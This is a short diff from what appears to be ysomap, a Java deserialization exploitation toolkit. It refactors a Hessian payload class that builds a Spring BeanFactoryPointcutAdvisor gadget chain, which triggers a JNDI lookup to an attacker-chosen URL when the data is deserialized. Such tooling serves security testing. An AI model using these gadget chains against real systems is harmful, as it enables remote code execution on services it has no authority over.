@@ -6,7 +6,6 @@ import ysomap.bullets.Bullet;
 import ysomap.bullets.spring.SpringJndiBullet1;
 import ysomap.common.annotation.*;
 import ysomap.core.util.PayloadHelper;
-import ysomap.core.util.ReflectionHelper;
 
 /**
  * @author wh1t3p1g
@@ -27,7 +26,7 @@ public class SpringAbstractBeanFactoryPointcutAdvisor extends HessianPayload{
     public Object pack(Object obj) throws Exception {
         DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
         pcadv.setBeanFactory((BeanFactory) obj);
-        pcadv.setAdviceBeanName(ReflectionHelper.get(bullet,"jndiURL"));
+        pcadv.setAdviceBeanName(bullet.get("jndiURL"));
         return PayloadHelper.makeMap(new DefaultBeanFactoryPointcutAdvisor(), pcadv);
     }
 }
